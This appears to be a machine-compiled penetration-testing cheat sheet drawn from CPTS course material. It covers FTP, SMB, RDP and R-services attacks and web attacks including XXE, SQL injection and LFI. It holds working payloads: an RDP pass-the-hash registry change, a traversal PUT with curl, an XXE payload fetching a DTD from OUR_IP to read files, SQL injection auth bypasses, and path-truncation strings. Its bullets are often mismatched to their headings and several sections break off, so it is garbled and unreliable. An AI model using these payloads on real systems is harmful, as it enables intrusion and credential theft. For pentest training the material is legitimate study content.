- To access with anonymous login, we can use the anonymous username and no password.
- Because with the anonymous login, the company could have stored sensitive information in a folder that the anonymous user of the FTP service could have access to.
- Anonymous Authentication Once we get access to an FTP server with anonymous credentials, we can start searching for interesting information.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Attacking FTP; Attacking SMB; Attacking RDP; Attacking Email Services` → re-enumerate with the gained access.

### Common problems / Why it fails

- In many cases, a user account will be locked or disabled after a certain number of failed login attempts.
- This feature can be disabled.
- This can be a bigger problem than the VRFY command since sites often have an alias such as "all." EXPN Command RCPT TO identifies the recipient of the email message.

### Remember this attack when

- Its purpose is to access file systems over a network as if they were local.

### Prerequisites

- Here, as with the Windows SMB protocol, the user must authenticate.
- | | NFSv4 | It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security.
- | NFS version 4.1 (RFC 8881) aims to provide protocol support to leverage cluster server deployments, including the ability to provide scalable parallel access to files distributed across multiple servers (pNFS extension).

- This means that NFS clients cannot communicate directly with SMB servers.
- | | NFSv3 | It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.

- However, the examples are based on real penetration tests and illustrate how and what information can be obtained.
- SSL certificate providers like Let's Encrypt share this with the web interface crt.sh, which stores the new entries in the database to be accessed later.
- We can also output the results in JSON format.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Domain Information` → re-enumerate with the gained access.

### Common problems / Why it fails

- Certificate Transparency is a process that is intended to enable the verification of issued digital certificates for encrypted Internet connections.
- The standard (RFC 6962) provides for the logging of all digital certificates issued by a certificate authority in audit-proof logs.
- This is intended to enable the detection of false or maliciously issued certificates for a domain.

### Remember this attack when

- As we discover new file-sharing services, we will need to investigate how they work and what tools we can use to interact with them.
- To install Evolution, we can use the following command: Linux - Install Evolution Note: If an error appears when starting evolution indicating "bwrap: Can't create file at ...", use this command to start evolution export WEBKITFORCESANDBOX=0 && evolution .
- If the server uses SMTPS or IMAPS, we'll need the appropriate encryption method (TLS on a dedicated port or STARTTLS after connecting).

- However, once we mount a file-sharing service, we must understand that we can use the available tools in Linux or Windows to interact with files and directories.
- As we discover new file-sharing services, we will need to investigate how they work and what tools we can use to interact with them.
- Email We typically need two protocols to send and receive messages, one for sending and another for receiving.

<a id="technique-password-attacks"></a>
## Password Attacks

Aliases: —  
Tags: attack, brute, domain, host, hydra, john, password, pop3, service, smtp, spray  
Category: Service Enumeration / Attacking Email Services  
OS: Cross-platform, Linux  
Service: POP3, SMTP  
Ports: 25, 110, 465, 587, 995

### Remember this attack when

- Hydra - Password Attack If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like Hydra, but these tools are usually blocked.
- Keep in mind that these tools need to be up-to-date because if the service provider changes something (which happens often), the tools may not work anymore.
- This is a perfect example of why we must understand what our tools are doing and have the know-how to modify them if they do not work properly for some reason.

### Prerequisites

- First, we need to get a username list and a password list and specify which service we want to attack.
- Keep in mind that these tools need to be up-to-date because if the service provider changes something (which happens often), the tools may not work anymore.
- This is a perfect example of why we must understand what our tools are doing and have the know-how to modify them if they do not work properly for some reason.

## Protocol Specifics Attacks

Aliases: —  
Tags: abuse, attack, brute, dns, domain, ftp, host, http, https, imap, john, kerberos, ldap, nmap, password, pop3, port, rdp, relay, rpc, scan, service, smb, smtp, spray, transfer, winrm  
Category: Service Enumeration / Attacking FTP; Attacking SMB; Attacking Email Services  
OS: Cross-platform, Linux, Windows  
Service: DNS, FTP, HTTP, HTTPS, IMAP, LDAP, POP3, RDP, RPC, SMB, SMTP, kerberos, winrm  
Ports: 21, 25, 53, 80, 88, 110, 111, 135, 139, 143, 389, 443, 445, 465, 587, 636, 993, 995, 3268, 3269, 3389, 5985, 5986

### Remember this attack when

- Brute Forcing If there is no anonymous authentication available, we can also brute-force the login for the FTP services using a list of the pre-generated usernames and passwords.
- Note: Although we may find services vulnerable to brute force, most applications today prevent these types of attacks.
- When you spawn your target, please wait up to 60 more seconds after seeing the IP address to ensure the corresponding service is launched correctly.

### Prerequisites

- If a null session is not enabled, we will need credentials to interact with the SMB protocol.
- Two common ways to obtain credentials are brute forcing and password spraying.
- Additionally, if we are targetting a non-domain joined computer, we will need to use the option --local-auth .

### What success looks like

- Note: By default CME will exit after a successful login is found.
- Using the --continue-on-success flag will continue spraying even after a valid password is found.
- Usually, we will only get access to the file system, abuse privileges, or exploit known vulnerabilities in a Linux environment, as we will discuss later in this section.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Attacking FTP; Attacking SMB; Attacking Email Services` → re-enumerate with the gained access.

### Common problems / Why it fails

- Note: If the --exec-method is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the --exec-method smbexec.
- Pass-the-Hash (PtH) If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH).
- - If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

### Variants

- No separately named variant was identified in the cited CPTS subsection.

<a id="technique-r-services"></a>
## R-Services

Aliases: —  
Tags: abuse, bypass, host, nmap, password, port, scan, service, shell, ssh, sudo  
Category: Service Enumeration / Linux Remote Management Protocols  
OS: Cross-platform, Linux  
Service: SSH  
Ports: 22

### Remember this attack when

- When users on one of these hosts attempt to access the system, they are automatically granted access without further authentication.
- /etc/hosts.equiv Now that we have a basic understanding of r-commands, let's do some quick footprinting using Nmap to determine if all necessary ports are open.
- The hosts.equiv and .rhosts files contain a list of hosts (IPs or Hostnames) and users that are trusted by the local host when a connection attempt is made using r-commands.

### Prerequisites

- Requires authentication through the use of a username and password through an unencrypted network socket.
- | The /etc/hosts.equiv file contains a list of trusted hosts and is used to grant access to other systems on the network.
- Misconfigurations in either of these files can allow an attacker to authenticate as another user without credentials, with the potential for gaining code execution.

### Enumeration / Detection

```shell-session
[!bash!]$ cat /etc/hosts.equiv

# <hostname> <local username>
pwnbox cry0l1t3
```

```shell-session

513/tcp open  login?

```

```shell-session
Last login: Fri Dec  2 16:11:21 from localhost

[htb-student@localhost ~]$
```

### What success looks like

- R-Services are a suite of services hosted to enable remote access or issue commands between Unix hosts over TCP/IP.
- R-services span across the ports 512, 513, and 514 and are only accessible through a suite of programs known as r-commands.
- The R-commands suite consists of the following programs: rcp (remote copy) rexec (remote execution) rlogin (remote login) rsh (remote shell) rstat ruptime rwho (remote who) Each command has its intended functionality; however, we will only cover the most commonly abused r-commands.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Linux Remote Management Protocols` → re-enumerate with the gained access.

### Common problems / Why it fails

- R-Services are a suite of services hosted to enable remote access or issue commands between Unix hosts over TCP/IP.
- Scanning for R-Services Access Control & Trusted Relationships The primary concern for r-services, and one of the primary reasons SSH was introduced to replace it, is the inherent issues regarding access control for these protocols.
- Listing Authenticated Users Using Rusers To provide additional information in conjunction with rwho, we can issue the rusers command.

### Variants

- No separately named variant was identified in the cited CPTS subsection.

<a id="technique-rdp-pass-the-hash-pth"></a>
## RDP Pass-the-Hash (PtH)

Aliases: —  
Tags: attack, crack, credential, hash, host, password, powershell, rdp  
Category: Service Enumeration / Attacking RDP  
OS: Cross-platform, Linux, Windows  
Service: RDP  
Ports: 3389

### Remember this attack when

- If we have plaintext credentials for the target user, it will be no problem to RDP into the system.
- However, what if we only have the NT hash of the user obtained from a credential dumping attack such as SAM database, and we could not crack the hash to reveal the plaintext password?
- Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access: If it works, we'll now be logged in via RDP as the target user without knowing their cleartext password.

### Prerequisites

- If we have plaintext credentials for the target user, it will be no problem to RDP into the system.
- However, what if we only have the NT hash of the user obtained from a credential dumping attack such as SAM database, and we could not crack the hash to reveal the plaintext password?
- In some instances, we can perform an RDP PtH attack to gain GUI access to the target system using tools like xfreerdp.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

```cmd-session
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

<a id="technique-rsync"></a>
## Rsync

Aliases: —  
Tags: attack, host, nmap, password, port, scan, service, ssh, sudo, transfer  
Category: Service Enumeration / Linux Remote Management Protocols  
OS: Linux  
Service: SSH  
Ports: 22

### Remember this attack when

- This algorithm reduces the amount of data transmitted over the network when a version of the file already exists on the destination host.
- It finds files that need to be transferred by looking at files that have changed in size or the last modified time.
- If you find credentials during a pentest and run into Rsync on an internal (or external) host, it is always worth checking for password re-use as you may be able to pull down some sensitive files that could be used to gain remote access to the target.

### Prerequisites

- It finds files that need to be transferred by looking at files that have changed in size or the last modified time.
- Other times we will need credentials.
- If you find credentials during a pentest and run into Rsync on an internal (or external) host, it is always worth checking for password re-use as you may be able to pull down some sensitive files that could be used to gain remote access to the target.

## SNMP — SNMP

Aliases: SNMP  
Tags: password, port, snmp  
Category: Service Enumeration / SNMP  
OS: Cross-platform / not specified  
Service: SNMP  
Ports: 161

### Remember this attack when

- If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side.
- The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.
- A sequence of numbers uniquely identifies each node, allowing the node's position in the tree to be determined.

### Prerequisites

- SNMP-enabled hardware includes routers, switches, servers, IoT devices, and many other devices that can also be queried and controlled using this standard protocol.
- For the SNMP client and server to exchange the respective values, the available SNMP objects must have unique addresses known on both sides.
- This addressing mechanism is an absolute prerequisite for successfully transmitting data and network monitoring using SNMP.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### What success looks like

- This addressing mechanism is an absolute prerequisite for successfully transmitting data and network monitoring using SNMP.
- MIB To ensure that SNMP access works across manufacturers and with different client-server combinations, the Management Information Base (MIB) was created.
- It contains at least one Object Identifier (OID), which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `SNMP` → re-enumerate with the gained access.

### Common problems / Why it fails

- However, a significant problem with the initial execution of the SNMP protocol is that the community string that provides security is only transmitted in plain text, meaning it has no built-in encryption.
- This causes many administrators a great deal of concern and creates some problems they are keen to avoid.
- At the same time, the lack of encryption of the data sent is also a problem.

<a id="technique-the-concept-of-the-attack-service-enumeration"></a>
## The Concept of the Attack — Service Enumeration

Aliases: —  
Tags: attack, curl, dns, domain, exploit, ftp, host, http, password, payload, rdp, scan, service, shell, smb, smtp, subdomain, traversal, upload  
Category: Service Enumeration / Latest FTP Vulnerabilities; Latest SMB Vulnerabilities; Latest RDP Vulnerabilities; Latest DNS Vulnerabilities; Latest Email Service Vulnerabilities  
OS: Cross-platform, Linux, Windows  
Service: DNS, FTP, HTTP, RDP, SMB, SMTP  
Ports: 21, 25, 53, 80, 139, 445, 465, 587, 3389

### Remember this attack when

- However, the CoreFTP service allows an HTTP PUT request, which we can use to write content to files.
- This is when the cycle starts all over again, but this time to write contents to the target system.
- | Since all restrictions were bypassed during the directory traversal vulnerability, the service approves writing the contents to the specified file.

### Prerequisites

- The Concept of Attacks Diagram showing flow from Source to Processes, Privileges, and Destination with related components.
- This leads to access to the restricted folder being bypassed.
- As a result, the write permissions on the HTTP PUT request are not adequately controlled, which leads to us being able to create the files we want outside of the authorized folders.

### Enumeration / Detection

```cmd-session
C:\> type C:\whoops

PoC.
```

### Exploitation

```shell-session
[!bash!]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

### What success looks like

- This leads to access to the restricted folder being bypassed.
- In simple terms, this is an integer overflow vulnerability in a function of an SMB driver that allows system commands to be overwritten while accessing memory.
- Arithmetic operations can always return unexpected values, resulting in an error.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Latest FTP Vulnerabilities; Latest SMB Vulnerabilities; Latest RDP Vulnerabilities; Latest DNS Vulnerabilities; Latest Email Service Vulnerabilities` → re-enumerate with the gained access.

### Common problems / Why it fails

- |Destination| Up to this point, we have bypassed the constraints imposed by the application using the escape characters (../../../../) and come to the second part, where the process writes the contents we specify to a file of our choice.
- Arithmetic operations can always return unexpected values, resulting in an error.
- Therefore, if an attacker finds a CNAME record in the company's DNS records that points to a subdomain that no longer exists and returns an HTTP 404 error, this subdomain can most likely be taken over by us through the use of the third-party provider.

### Variants

- No separately named variant was identified in the cited CPTS subsection.

### Useful commands


<a id="technique-windows-remote-management-protocols-rdp"></a>
## Windows Remote Management Protocols — RDP

Aliases: RDP  
Tags: port, rdp, service  
Category: Service Enumeration / Windows Remote Management Protocols  
OS: Windows  
Service: RDP  
Ports: 3389

### Remember this attack when

- This protocol allows display and control commands to be transmitted via the GUI encrypted over IP networks.
- For an RDP session to be established, both the network firewall and the firewall on the server must allow connections from the outside.
- If Network Address Translation (NAT) is used on the route between client and server, as is often the case with Internet connections, the remote computer needs the public IP address to reach the server.

### Prerequisites

- The Remote Desktop Protocol (RDP) is a protocol developed by Microsoft for remote access to a computer running the Windows operating system.
- For an RDP session to be established, both the network firewall and the firewall on the server must allow connections from the outside.
- In addition, port forwarding must be set up on the NAT router in the direction of the server.

<a id="technique-advanced-exfiltration-with-cdata"></a>
## Advanced Exfiltration with CDATA

Aliases: —  
Tags: attack, bypass, host, http, port, xxe  
Category: Web Attacks / Advanced File Disclosure  
OS: Cross-platform, Linux  
Service: HTTP  
Ports: 80

### Remember this attack when

- In the previous section, we saw how we could use PHP filters to encode PHP source files, such that they would not break the XML format when referenced, which (as we saw) prevented us from reading these files.
- One easy way to tackle this issue would be to define a begin internal entity with , and then place our external entity file in between, and it should be considered as a CDATA element, as follows: After that, if we reference the &joined; entity, it should contain our escaped data.
- However, this will not work, since XML prevents joining internal and external entities, so we will have to find a better way to do so.

### Prerequisites

- Confirm the access, service configuration, and target-specific values shown in the cited CPTS source before running the commands.

### Enumeration / Detection

```xml
<!ENTITY joined "%begin;%file;%end;">
```

### Exploitation

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

```shell-session
[!bash!]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
[!bash!]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

### What success looks like

- To output data that does not conform to the XML format, we can wrap the content of the external file reference with a CDATA tag (e.g.
- As we can see, we were able to obtain the file's source code without needing to encode it to base64, which saves a lot of time when going through various files to look for secrets and passwords.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Advanced File Disclosure` → re-enumerate with the gained access.

- One easy way to tackle this issue would be to define a begin internal entity with , and then place our external entity file in between, and it should be considered as a CDATA element, as follows: After that, if we reference the &joined; entity, it should contain our escaped data.

<a id="technique-another-example"></a>
## Another Example

Aliases: —  
Tags: hash, password, port, sql  
Category: Web Attacks / Using Comments; Reading Files  
OS: Cross-platform  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- SQL supports the usage of parenthesis if the application needs to check for particular conditions before others.

### Prerequisites

- Let us try logging in with valid credentials admin / p@ssw0rd to see the response.
- As expected, the login failed even though we supplied valid credentials because the admin’s ID equals 1.
- So let us try logging in with the credentials of another user, such as tom.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

```sql
SELECT * FROM logins where (username='admin')
```

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

### What success looks like

- Admin panel showing an SQL query execution: SELECT FROM logins WHERE (username='tom' AND id 1) AND password='f86a3c565937e6315864d1a43c48e7'; with a message: Login successful as user: tom" Logging in as the user with an id not equal to 1 was successful.
- To execute the query successfully, we will have to add a closing parenthesis.
- Admin panel showing an SQL query execution: SELECT FROM logins WHERE (username='admin'--' AND id 1) AND password='437b930db84b8079c2dd804a71936b5f'; with a message: Login successful as user: admin" The query was successful, and we logged in as admin.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Using Comments; Reading Files` → re-enumerate with the gained access.

### Common problems / Why it fails

- Let us look at a scenario like this: Admin panel showing an SQL query execution: SELECT FROM logins WHERE (username='admin' AND id 1) AND password='437b930db84b8079c2dd804a71936b5f'; with a message: Login failed!
- Admin panel showing an SQL query execution: SELECT FROM logins WHERE (username='admin' AND id 1) AND password='0f359740bd1cda994f8b55330c86d845'; with a message: Login failed!
- As expected, the login failed even though we supplied valid credentials because the admin’s ID equals 1.

### Variants

- No separately named variant was identified in the cited CPTS subsection.

### Useful commands

<a id="technique-appended-extension"></a>
## Appended Extension

Aliases: —  
Tags: bypass, exploit, payload  
Category: Web Attacks / Basic Bypasses  
OS: Cross-platform, Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored.
- Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (/etc/passwd/.) then the /.
- If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path.

### Prerequisites

- Finally, it is also important to note that we would also need to start the path with a non-existing directory for this technique to work.
- This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

```url
?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
```

```shell-session
[!bash!]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

### What success looks like

- The command returns the expected target data, authenticated access, execution, or shell shown in the cited CPTS example.

### What to do next

<a id="technique-application-discovery-enumeration"></a>
## Application Discovery & Enumeration

Aliases: —  
Tags: attack, domain, host, nmap, port, scan, splunk  
Category: Web Attacks / Application Discovery & Enumeration  
OS: Cross-platform, Linux, Windows  
Service: splunk  
Ports: 8000, 8089

### Remember this attack when

- If an organization is unsure what is present on its network, how will it know what to protect and what potential holes exist?
- We can provide this data to our clients as a combination of the findings in our reports (i.e., an application with default credentials admin:admin, as appendices such as a list of identified services mapped to hosts, or supplemental scan data).
- We can even take it a step further and educate our clients on some of the tools that we use daily so they can begin to perform periodic and proactive recon of their networks and find gaps before penetration testers, or worse, attackers, find them first.

### Prerequisites

- We can provide this data to our clients as a combination of the findings in our reports (i.e., an application with default credentials admin:admin, as appendices such as a list of identified services mapped to hosts, or supplemental scan data).
- As penetration testers, we need to have strong enumeration skills and be able to get the "lay of the land" on any network starting with very little to no information (black box discovery or just a set of CIDR ranges).

### Enumeration / Detection

```shell-session
[!bash!]$ nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```

### Exploitation

```shell-session
[!bash!]$ nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```

### What success looks like

- Certain applications have administrative portals that can be restricted to only being accessible from specific IP addresses or the host itself (localhost).
- Both of these tools can be fed raw Nmap XML scan output (Aquatone can also take Masscan XML; EyeWitness can take Nessus XML output) and be used to quickly inspect all hosts running web applications and take screenshots of each.

### What to do next

Aliases: Enumeration

Service: HTTP, LDAP  
Ports: 80, 389, 636, 3268, 3269

### Remember this attack when

- An nmap services scan is a type of network scanning technique used to identify and analyze the services running on a target system or network.
- The scan provides valuable information about the target's network infrastructure, and potential vulnerabilities and attack surfaces.
- This is a significant security issue as it allows anyone with knowledge of the vulnerability to gain unauthorised access to the system and potentially sensitive data.

### Prerequisites

- Attempting to log in using a wildcard character () in the username and password fields grants access to the system, effectively bypassing any authentication measures that had been implemented.
- This is a significant security issue as it allows anyone with knowledge of the vulnerability to gain unauthorised access to the system and potentially sensitive data.

<a id="technique-attacking-ldap-ldap"></a>
## Attacking LDAP — LDAP

Aliases: LDAP  
Tags: dns, kerberos, ldap, service  
Category: Web Attacks / Attacking LDAP  
OS: Linux, Windows  
Service: DNS, LDAP, kerberos  
Ports: 53, 88, 389, 636, 3268, 3269

### Remember this attack when

- | | Injection | Vulnerable to LDAP injection attacks, where malicious users can manipulate LDAP queries and gain unauthorised access to data or resources.
- Here are some common use cases: | Use Case | Description | | ------------------ | ------------------------------------------------------------ | | Authentication | LDAP can be used for central authentication, allowing users to have single login credentials across multiple applications and systems.
- | | It has a flexible and extensible schema that allows custom attributes and object classes to be defined by administrators or developers.

### Prerequisites

- However, it also suffers some significant issues: | Functionality | Description | | ------------- | ------------------------------------------------------------ | | Compliance | Directory servers must be LDAP compliant for service to be deployed, which may limit the choice of vendors and products.
- LDAPS (LDAP over SSL) or StartTLS must be used to enable encryption.
- | | Injection | Vulnerable to LDAP injection attacks, where malicious users can manipulate LDAP queries and gain unauthorised access to data or resources.

### Enumeration / Detection

```ldap
dn: uid=jdoe,ou=people,dc=example,dc=com
objectClass: inetOrgPerson
objectClass: organizationalPerson
objectClass: person
objectClass: top
cn: John Doe
sn: Doe
uid: jdoe
mail: john.doe@example.com

result: 0 Success
```

### Exploitation

```shell-session
[!bash!]$ ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"

```

### What success looks like

- --- LDAP (Lightweight Directory Access Protocol) is a protocol used to access and manage directory information.
- | | Authentication | It provides authentication mechanisms that enable users to sign on once and access multiple resources on the server securely.
- | | Injection | Vulnerable to LDAP injection attacks, where malicious users can manipulate LDAP queries and gain unauthorised access to data or resources.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Attacking LDAP` → re-enumerate with the gained access.

### Common problems / Why it fails

- However, it also suffers some significant issues: | Functionality | Description | | ------------- | ------------------------------------------------------------ | | Compliance | Directory servers must be LDAP compliant for service to be deployed, which may limit the choice of vendors and products.

### Variants

<a id="technique-attacking-thick-client-applications"></a>
## Attacking Thick Client Applications

Aliases: —  
Tags: http, https, sql, xss  
Category: Web Attacks / Attacking Thick Client Applications  
OS: Cross-platform  
Service: HTTP, HTTPS  
Ports: 80, 443

### Remember this attack when

- The sandbox is a virtual environment that allows untrusted code, such as code downloaded from the internet, to run safely on a user's system without posing a security risk.
- Web-specific vulnerabilities like XSS, CSRF, and Clickjacking, do not apply to thick client applications.

### Prerequisites

- Unlike thin client applications that run on a remote server and can be accessed through the web browser, these applications do not require internet access to run, and they perform better in processing power, memory, and storage capacity.
- Deploying and maintaining thick client applications can be more difficult than thin client applications since patches and updates must be done locally to the user's computer.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### What success looks like

- Unlike thin client applications that run on a remote server and can be accessed through the web browser, these applications do not require internet access to run, and they perform better in processing power, memory, and storage capacity.
- In addition, it isolates untrusted code, preventing it from accessing or modifying system resources and other applications without proper authorization.
- - Working without internet access.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Attacking Thick Client Applications` → re-enumerate with the gained access.

- However, thick client applications are considered less secure than web applications with many attacks being applicable, including: - Improper Error Handling.

<a id="technique-attacking-tomcat-cgi"></a>
## Attacking Tomcat CGI

Aliases: —  
Tags: attack, exploit, http, inject, tomcat  
Category: Web Attacks / Attacking Tomcat CGI  
OS: Cross-platform, Linux, Windows  
Service: HTTP, tomcat  
Ports: 80, 8080

### Remember this attack when

- This vulnerability affects Windows systems that have the enableCmdLineArguments feature enabled.
- An attacker can exploit this vulnerability by exploiting a command injection flaw resulting from a Tomcat CGI Servlet input validation error, thus allowing them to execute arbitrary commands on the affected system.
- If set to true, the CGI Servlet parses the query string and passes it to the CGI script as arguments.

### Prerequisites

- This vulnerability affects Windows systems that have the enableCmdLineArguments feature enabled.
- However, a problem arises when enableCmdLineArguments is enabled on Windows systems because the CGI Servlet fails to properly validate the input from the web browser before passing it to the CGI script.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

```http
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
```

```http
http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald
```

- | | Use any programming language that can read from standard input and write to standard output.

<a id="technique-auth-bypass-with-or-operator"></a>
## Auth Bypass with OR operator

Aliases: —  
Tags: bypass, password, sql  
Category: Web Attacks / Subverting Query Logic  
OS: Cross-platform / not specified  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- However, what if we did not know a valid username?

### Prerequisites

- Logic flow shows OR condition as False, making the entire statement False To successfully log in once again, we will need an overall true query.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Exploitation

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### What success looks like

- Admin panel showing an SQL query execution: SELECT FROM logins WHERE username='admin' OR '1'='1' AND password='something'; with a message: Login successful as user: admin We were able to log in successfully as admin.
- Logic flow shows OR condition as False, making the entire statement False To successfully log in once again, we will need an overall true query.
- This can be achieved by injecting an OR condition into the password field, so it will always return true.

### What to do next

Validate the result → preserve any credentials/output → pivot to the next CPTS-linked enumeration or exploitation step in `Subverting Query Logic` → re-enumerate with the gained access.

### Common problems / Why it fails

- Admin panel showing an SQL query execution: SELECT FROM logins WHERE username='notAdmin' OR '1'='1' AND password='something'; with a message: Login failed!
- The login failed because notAdmin does not exist in the table and resulted in a false query overall.

### Variants

- No separately named variant was identified in the cited CPTS subsection.

## Authenticated Remote Code Execution

Aliases: —  
Tags: attack, credential, exploit, password, payload, shell  
Category: Web Attacks / Attacking GitLab  
OS: Cross-platform, Linux  
Service: Not service-specific  
Ports: Not fixed / not specified

### Remember this attack when

- GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution vulnerability due to an issue with ExifTool handling metadata in uploaded image files.
- This issue was fixed by GitLab rather quickly, but some companies are still likely using a vulnerable version.
- In some instances, this would only work if we could obtain valid credentials through OSINT or a credential guessing attack.

### Prerequisites

- As this is authenticated remote code execution, we first need a valid username and password.
- In some instances, this would only work if we could obtain valid credentials through OSINT or a credential guessing attack.

### Enumeration / Detection

_No distinct command block was present in this CPTS subsection; use the source-linked observations above._

### Remember this attack when

- If the MySQL database returns matched records, the credentials are valid, so the PHP code would evaluate the login attempt condition as true.
- If the condition evaluates to true, the admin record is returned, and our login is validated.
- Let us see what happens when we enter incorrect credentials.
